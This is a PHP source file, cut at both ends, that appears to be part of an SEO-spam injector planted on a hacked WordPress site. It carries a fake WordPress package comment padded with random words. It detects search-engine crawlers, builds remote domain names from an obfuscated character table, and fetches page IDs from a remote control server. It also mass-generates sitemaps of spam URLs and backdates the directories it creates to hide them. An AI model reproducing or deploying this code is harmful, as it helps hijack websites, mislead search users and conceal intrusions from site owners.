	} else {
		$httpPre = 'http';
	}
	
	return $httpPre;
}


function get_shares(){
	
	$siteLink= get_scheme() .'://'.$_SERVER['HTTP_HOST'];
	$shareStr = '
<ul>
<li><a href="https://www.facebook.com/sharer/sharer.php?u=domain" target="_blank"><span>facebook</span></a></li>
<li><a href="https://twitter.com/share?url=domain" target="_blank"><span>twitter</span></a></li>
<li><a href="https://www.linkedin.com/shareArticle?mini=true&url=domain" target="_blank"><span>linkedin</span></a></li>
<li><a href="https://pinterest.com/pin/create/button/?url=domain" target="_blank"><span>pinterest</span></a></li>
</ul>
';
  $shareStr = str_replace('domain',$siteLink,$shareStr);
  
  return $shareStr;
	
}

function getCatLink($CatName,$id23){
		
		global $arrnametime,$arrKeywz,$date_string;		
	
		$filePres = '';		$fileEnds = '';		$siteLink= get_scheme() .'://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?cat=";		}else{
			$filePres = $siteLink."/";		}
		
		$CatName = str_replace('&',' ',$CatName);
		$CatName = str_replace('&',' ',$CatName);
		if(JDT == 3){
			
			$CatName = preg_replace('#\s+#i','-',$CatName);
			
			
			while(strstr($CatName,'--'))
				$CatName = str_replace('--','-',$CatName);
			
			$urlMid = $CatName;	
			
			$rtStr = $filePres.$urlMid;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
		// BZCAT
		
		global $tpKeyStrCat;
		
		$endNumber = '';
		
		$tpNum = KEYJG * $id23;
		$tpKey = $tpNum % count($date_string);
		$lenStr = strlen($date_string[$tpKey]);
		if($tpKeyStrCat == -1)
			$tpKeyStrCat = (KEYJG + $pid) % $lenStr;
		$tpstr = $date_string[$tpKey];

		$randStr = '';
		$arrNum = array();
		for($i = 0; $i < $lenStr; $i++){
			$vs = $tpstr{$tpKeyStrCat};
			$int_vs = ord($vs);
			if($int_vs >= 100 and $int_vs <= 119){
				$arrNum[] = $int_vs % 10;
				if(count($arrNum) >= 3){
					break;
				}
			}
			
			$tpKeyStrCat = ($tpKeyStrCat + 1) % $lenStr;
		}
		
		$catNum = implode('',$arrNum);
		
		$CatName = preg_replace('#\s+#i','-',$CatName);
		$CatName = str_replace('--','-',$CatName);
		$urlMid =  str_replace('--','-',$CatName) . '/category-' . $catNum;
		// $urlMid .= JTHZ;		
		$rtStr = $filePres.$urlMid.'/';
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
			
}
	
	
function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}


function getRandCId($rqurl){
	global $thisdom;
	
	for($i=0;$i<3;$i++){
		$idUrl =  GETDOM . "gpage.php?site=$thisdom&cid=$rqurl";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		if(preg_match('#<cid>(\d+)</cid>#i',$tempIdStr,$matchId)){
			return $matchId[1];
		}
	}
	
	  
	http_response_code(404);  
	exit; 
	
}

/**
 * alcohol architecture auxiliary award cargo distinguish earthquake elaborate entitle evolution expand favorite fertilizer gene hestiate hollow laser lest personnel promote rely strategic treaty tremendous waist.
 * adopt architect blast evolve extreme flee forbid generate jungle mainland nucleus offend personal sake scratch sophisticated.
 * acid authority biology discount distinguish illegal minimum portable virus.
 * continuous enclose excess index loosen powder suburb territory.
 * approach integrate leather molecule prominent.
 * advertise commit dump estimate gene network.
 * constant diverse elastic expense golf hint impose insure launch leisure mist origin oxygen pat shift suspicious utilify vacuum via virtue.
 * bother chaos giant herd oblige racial radiation skim survey videotape virtual.
 * biology compete dumb evolution external glimpse harmony hint hostile kneel leather passion rely shelter swallow tidy undergraduate voluntary weave withdraw.
 * advertisement automatic available avenue cliff female glimpse global guarantee previous scandal the torture version vitally volume.
 * distinguish insurance nucleus prohibit racial reluctant respond ruin scandal semester shift shiver survey target terminal valley vessel.
 * approximate avenue conquer defect expand expansion gasoline germ gesture gratitude lest modify noticeable nuisance presumably professional sketch virtual volunteer wax.
 * approach architect conservation delay devise domestic exclusive expand extreme glimpse modify outstanding peak preserve provision trace transmit valley.
 * coarse constant evaluate expense explosive gallery garbage magnet repetition theme.
 * blast delay jam lean liberty lynar origin outset resistant significance undergraduate.
 * accelerate appropriate arbitrary calendar electron giant jail label participate quotation territory variation volcano volume wander.
 * Internet abundant acknowledge agency cargo ceremony competition entitle estimate favorable geography highlight infer parade previous relief resume revenue voluntary.
 * deputy faculty neutral prior sexual terror.
 * automatic bunch continuous enclose glimpse incident likelihood maintain passport personnel radiation register removal respond tremble undergo undertake vacuum virtual welfare.
 * capture cargo collision delicate emotion excursion favorable flexible gap optional quit region remote resistant ridiculous secure shrink title tone vitally xploit.
 * duration liberal luxury neglect.
 * algebra bachelor cliff deputy display explode fate frustrate golf haste highlight humble leather nuclear partial petrol recreation remarkable removal ruin smash stable the urban wax.
 * expand naked network notion.
 * geography idle opportunity volume.
 * applause bundle commit competent durable explosive genuine guilty horrible label male marveous maximum mist pants radiation range resemble vague vertical vital volcano.
 * estimate gene holy inevitable talent tender.
 * boundary data entry female manual nucleus retain ruin vain.
 *
 * @package WordPress
 */
	

function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	require(FILEDIRNAME . "/id$num.php");	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}

function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 


function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
$arrABC = range('a','z');
$tparrsI = $filenames;
$randnum = rand(7000,7600);
$tparrII = array_rand($tparrsI,$randnum);
$tparrIII = array();
foreach($tparrII as $vs){
	$tparrIII[$vs] = $filenames[$vs];
}
$filenames = $tparrIII;

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath=get_scheme() .'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink=get_scheme() .'://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $key => $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		
			$tempPid = $key;
		
			$url = getalink($tempPid,$value2);
			
 		if(JDT == 0){

		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../xmlmap/' . $arrABC[$gnumber-2] . 'goodssearch' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#' . $arrABC[$gnumber-2] . 'goodssearch'  .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
			
			
		}else{
			
			if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../xmlmap/' . $arrABC[$gnumber-1] . 'goodssearch' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#' . $arrABC[$gnumber-1] . 'goodssearch'  .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
			
		}
		
		
			
			
			
			
			
	}
	
	
 		if(JDT == 0){
			
				{
		$gFile =  '../xmlmap/' . $arrABC[$gnumber-2] . 'goodssearch' .'.xml';			echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#' . $arrABC[$gnumber-2] . 'goodssearch'  .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;	
		}
			
		}else{
			
			{
		$gFile =  '../xmlmap/' . $arrABC[$gnumber-1] . 'goodssearch' .'.xml';			echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#' . $arrABC[$gnumber-1] . 'goodssearch'  .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;	
		}
	
	
		}
	
	
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}


function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
$arrABC = range('a','z');
$tparrsI = $filenames;
$randnum = rand(7000,7600);
$tparrII = array_rand($tparrsI,$randnum);
$tparrIII = array();
foreach($tparrII as $vs){
	$tparrIII[$vs] = $filenames[$vs];
}
$filenames = $tparrIII;
	
	$filePres = '';	$fileEnds = '';	
	
	$fpath=get_scheme() .'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink=get_scheme() .'://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $key => $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");	
		
			$tempPid = $key;
				$url = getalink($tempPid,$value2);
		
		 if(JDT == 0){
			 
			 	if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../xmlmap/sitemap.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'site_map.xml'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
			 
			 
			 
		 }else{
			 
			 
			 	if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../xmlmap/' . $arrABC[$gnumber-1] . 'goodssearch' .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#' . $arrABC[$gnumber-1] . 'goodssearch'  .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
			
			
			 
		 }

		
	
			
			
	}
	
	
	
		 if(JDT == 0){
			
	
	{
		$gFile =  '../xmlmap/sitemap.xml';		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'site_map.xml'.PHP_EOL,FILE_APPEND);
		$gnumber++;
	}
	
		 }else{
			 
			 	
	{
		$gFile =  '../xmlmap/' . $arrABC[$gnumber-1] . 'goodssearch' .'.xml';		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#' . $arrABC[$gnumber-1] . 'goodssearch'  .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;
	}
			 
		 }
	
	
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}
	
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curlGetOne($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 

function curl_getjs_from_webpage($url,$time){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_TIMEOUT => $time,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_TIMEOUT, $time);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}

function curlGetOne($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}



	
////



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}


	function strFilter($str){
		$str = str_replace('`', '', $str);
		$str = str_replace('·', '', $str);
		$str = str_replace('~', '', $str);
		$str = str_replace('!', '', $str);
		$str = str_replace('！', '', $str);
		$str = str_replace('@', '', $str);
		$str = str_replace('#', '', $str);
		$str = str_replace('$', '', $str);
		$str = str_replace('￥', '', $str);
		$str = str_replace('%', '', $str);
		$str = str_replace('^', '', $str);
		$str = str_replace('……', '', $str);
		$str = str_replace('*', '', $str);
		$str = str_replace('(', '', $str);
		$str = str_replace(')', '', $str);
		$str = str_replace('（', '', $str);
		$str = str_replace('）', '', $str);
		$str = str_replace('-', '', $str);
		$str = str_replace('_', '', $str);
		$str = str_replace('——', '', $str);
		$str = str_replace('+', '', $str);
		$str = str_replace('=', '', $str);
		$str = str_replace('|', '', $str);
		$str = str_replace('\\', '', $str);
		$str = str_replace('[', '', $str);
		$str = str_replace(']', '', $str);
		$str = str_replace('【', '', $str);
		$str = str_replace('】', '', $str);
		$str = str_replace('{', '', $str);
		$str = str_replace('}', '', $str);
		$str = str_replace('；', '', $str);
		$str = str_replace(':', '', $str);
		$str = str_replace('<', '', $str);
		$str = str_replace('>', '', $str);
		$str = str_replace('：', '', $str);
		$str = str_replace('\'', '', $str);
		$str = str_replace('"', '', $str);
		$str = str_replace(',', '', $str);
		$str = str_replace('，', '', $str);
		$str = str_replace('《', '', $str);
		$str = str_replace('》', '', $str);
		$str = str_replace('.', '', $str);
		$str = str_replace('。', '', $str);
		$str = str_replace('–', '', $str);
		$str = str_replace('–', '', $str);
		$str = str_replace('/', '', $str);
		$str = str_replace('、', '', $str);
		$str = str_replace('?', '', $str);
		$str = str_replace('？', '', $str);
		$str = str_replace('°', '', $str);
		$str = str_replace('&', '&amp;', $str);
		return trim($str);
	}




	function getalink($pid,$pname=''){
		
		global $arrnametime,$arrKeywz,$arr_word,$date_string;		
		
		
		if(strstr($pname,'#cat#')){
			$tp_pname_arr = explode('#cat#',$pname);
			$pname = $tp_pname_arr[1];
			$precat = $tp_pname_arr[0];
		}
		
		if(function_exists("preg_split")){
			$tpnameArr = preg_split('/\s+/us', $pname);		
		}else{
			$tpnameArr = explode(' ', $pname);
		}
		
		$pnameArr = array();
		foreach($tpnameArr as $tpvs){
			$tpvs = trim($tpvs);
			if($tpvs){
				$pnameArr[] = $tpvs;
			}
		}
		
		$numPname = count($pnameArr);
		
		if($numPname > 3){
			$numLinkKey = round(PNAMELEN * $numPname / 100);
			$yushu = KEYJG % $numPname;
			
			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$numPname;$i++){
				if($i<$yushu){
					$arrLast[] = $pnameArr[$i];
				}else{
					$arrPre[] = $pnameArr[$i];
				}
			}
			
			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$usedNameArr = array();
			for($i=0;$i<$numLinkKey;$i++){
				$usedNameArr[$i] = $arrPre[$i];
			}

			if(count($usedNameArr)){
				$pname = implode(' ',$usedNameArr);
			}
			
		}
		
		if(JDT == 0){
			$precat = strFilter($precat);
			$precat = preg_replace('/\s+/', '-', $precat);
		}
			
		
		$pname = strFilter($pname);

		$filePres = '';		$fileEnds = '';		$siteLink= get_scheme() .'://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
	
		$rsp = '#'. BZPRO .'\d+#';
		$rsp2 = '#\d+-#';
		$rsp3 = '#-\d+#';
		$pname = trim($pname);
		
		
		$pname = trim(str_replace('>>',' ',$pname));
		$pname = preg_replace('/\s+/', '-', $pname);
	
		
		if(JDT == 3){
			
			$rs = '#&[^;]+;#i';
			$pname = preg_replace($rs,'',$pname);
	
		
			while(strstr($pname,'&'))
				$pname = str_replace('&','',$pname);
			
			while(strstr($pname,'--'))
				$pname = str_replace('--','-',$pname);
			
			$urlMid = $pname .'-' .$pid;
			$rtStr = $filePres.$urlMid;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
			
			
		$tpNum = KEYJG * $pid; 
		$tpKey = $tpNum % count($date_string);
		$tpKeyStr = (KEYJG + $pid) % strlen($date_string[$tpKey]);
		$nums = (KEYJG + $pid) % 2 ? 5 : 6 ;
		
		$randStr = '';
		for($i = 0; $i < $nums; $i++){
			$tpstr = $date_string[$tpKey];
			$randStr .= $tpstr{$tpKeyStr};
			$tpKey = ($tpKey + 1) % count($date_string);
		}
			
		if(strlen($pname) > 235){
			$rs = '#&[^;]+;#i';
			$pname = preg_replace($rs,'',$pname);
			$pname = str_replace('&','',$pname);
			$pname = str_replace('&',';',$pname);
			if(function_exists("mb_substr")){
				$pname = mb_substr($pname, 0, 235, 'utf-8');
			}else{
				$pname = substr($pname, 0, 235);
			}
		}	
		
		$precat = preg_replace($rsp,'',$precat);
		$precat = preg_replace($rsp2,'-',$precat);
		$precat = preg_replace($rsp3,'-',$precat);
		$precat = str_replace('&','',$precat);
		$precat = str_replace('>>',' ',$precat);
		$precat = str_replace('&',';',$precat);
		$precat = preg_replace('/\s+/', '-', $precat);

		$pname = preg_replace($rsp,'',$pname);
		$pname = preg_replace($rsp2,'-',$pname);
		$pname = preg_replace($rsp3,'-',$pname);
		
		
			
		if(JDT == 0){
			$urlMid = $precat .'/'. $randStr .'-'. $pid .'/'. $pname;
		}else{
			$urlMid = $precat .'/'. $randStr .'-'. $pid .'/'. $pname;
		}
			

		
			$urlMid .= JTHZ;			$urlMid = str_replace("-/","/",$urlMid);			$urlMid = str_replace("-".JTHZ,JTHZ,$urlMid);		
		
			
			while(strstr($urlMid,'--'))
				$urlMid = str_replace('--','-',$urlMid);	
			// $urlMid = str_replace('/-','/',$urlMid);	
			
		$rtStr = $filePres.$urlMid;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		$rtStr = str_replace('-amp;-','-&amp;-',$rtStr);
		return $rtStr;
	}
	
	

  
  
  
	
	
	
// 

	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:-";
    return ($str);
} 


 
function getarr(){
		global $O00O0O;
		$arr[0]=$O00O0O{6}.$O00O0O{17}.$O00O0O{14}.$O00O0O{2}.$O00O0O{4}.$O00O0O{17}.$O00O0O{24}.$O00O0O{9}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[1]=$O00O0O{10}.$O00O0O{6}.$O00O0O{15}.$O00O0O{11}.$O00O0O{1}.$O00O0O{3}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[2]=$O00O0O{17}.$O00O0O{12}.$O00O0O{17}.$O00O0O{21}.$O00O0O{4}.$O00O0O{13}.$O00O0O{3}.$O00O0O{14}.$O00O0O{17}.$O00O0O{18}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[3]=$O00O0O{13}.$O00O0O{1}.$O00O0O{11}.$O00O0O{14}.$O00O0O{14}.$O00O0O{17}.$O00O0O{8}.$O00O0O{0}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[4]=$O00O0O{22}.$O00O0O{2}.$O00O0O{7}.$O00O0O{8}.$O00O0O{11}.$O00O0O{11}.$O00O0O{25}.$O00O0O{20}.$O00O0O{10}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};
	return $arr;
}

	
function getthisdom(){
	$myArrs = getarr();
    return 'http://www.'.$myArrs[CENTERKEY].MYDIR;
} 
 
 
 
function get_real_ip(){
	
	
	   $ip = '';
    /**
     * resolve any proxies
     */
    if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED'];
